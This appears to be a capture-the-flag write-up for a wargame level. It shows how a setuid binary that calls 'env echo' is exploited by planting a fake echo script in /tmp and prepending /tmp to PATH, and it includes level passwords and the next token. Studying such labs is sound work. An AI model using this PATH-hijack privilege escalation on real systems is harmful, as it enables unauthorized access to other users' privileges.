# 03

Login

```b
> ssh level03@$(ifconfig|grep 'inet '|awk 'NR==2 {print $2}') -p 4242
> Password: kooda2puivaav1idi4f57q8iq
```

Inspect
- âŒ `file` `readelf` `strings` 
- âœ… `ltrace` 

```
> ls -l
-rwsr-sr-x 1 flag03 level03 8627 level03
 ^^^       owner flag03 can rwx also setuid bit is set
    ^^^    group level03 can rx plus setgid bit (s) is set
       ^^^ others can rx

ðŸ‘‰ when ./level03 is run
  the entire process runs with owner flag03's priviledges
  ie. I, user level00, can exploit priviledges limited to flag03

ðŸ‘‰ conclusion: execute the ./level03 and doing so we gain
  temporary elevated permissions as flag03
```

- We may also try `id` & `namei`

```b
> id
uid=2003(level03) gid=2003(level03) groups=2003(level03),100(users)

> namei -l ./level03 
dr-x------ level03 level03 .
-rwsr-sr-x flag03  level03 level03

> namei -l /bin/getflag
-rwxr-xr-x root root getflag
```

- `ltrace` traces library function calls when the binary is executed

```b
> ltrace ./level03
  ðŸ‘‰ we can see the `s` bit in action

### output
getegid()                                           = 2003
geteuid()                                           = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me" ...

### observations
ðŸ‘‰ getegid & geteuid return a effective group/user ID 2003 
  which is my `id` as `level03`.
ðŸ‘‰ Because privileges are elevated during the process
  we have temporary permissions as `flag03`.
ðŸ‘‰ This way we can exploit the `/usr/bin/env echo`
  relative path vulnerability.
```

- Solution

```b
> whereis getflag
getflag: /bin/getflag
> echo -e "#\!/bin/bash\n/bin/getflag" > /tmp/echo
> chmod +x /tmp/echo
> export PATH=/tmp:$PATH  ðŸ‘ˆ prepend tmp to get it checked first
> ./level03
```

- Token

```b
> su level04
> Password: qi0maab88jeaj46qoumi7maus
```
